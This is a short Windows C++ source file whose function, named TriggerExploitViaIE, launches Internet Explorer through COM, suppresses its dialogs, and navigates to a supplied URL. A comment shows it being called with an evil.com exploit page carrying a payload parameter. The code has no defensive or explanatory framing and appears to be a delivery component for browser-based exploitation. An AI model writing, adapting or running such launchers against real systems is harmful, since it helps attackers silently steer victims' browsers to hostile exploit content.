#include <Windows.h>
#include <MsHtmHst.h>
#include <ExDisp.h>
#include <string>

BOOL TriggerExploitViaIE(LPCWSTR url) {
    CoInitialize(NULL);
    IWebBrowser2* pBrowser;
    HRESULT hr = CoCreateInstance(CLSID_InternetExplorer, NULL, CLSCTX_LOCAL_SERVER, IID_IWebBrowser2, (void**)&pBrowser);
    if (SUCCEEDED(hr)) {
        pBrowser->put_Visible(VARIANT_TRUE);

        IWebBrowser2* pWebBrowser2;
        if (SUCCEEDED(pBrowser->QueryInterface(IID_IWebBrowser2, (void**)&pWebBrowser2))) {
            pWebBrowser2->put_Silent(VARIANT_TRUE);
            pWebBrowser2->Release();
        }

        VARIANT empty;
        VariantInit(&empty);
        BSTR bstrUrl = SysAllocString(url);
        hr = pBrowser->Navigate(bstrUrl, &empty, &empty, &empty, &empty);
        SysFreeString(bstrUrl);
        pBrowser->Release();
    }
    CoUninitialize();
    return SUCCEEDED(hr);
}

// Example: TriggerExploitViaIE(L"http://evil.com/exploit.html?payload=");
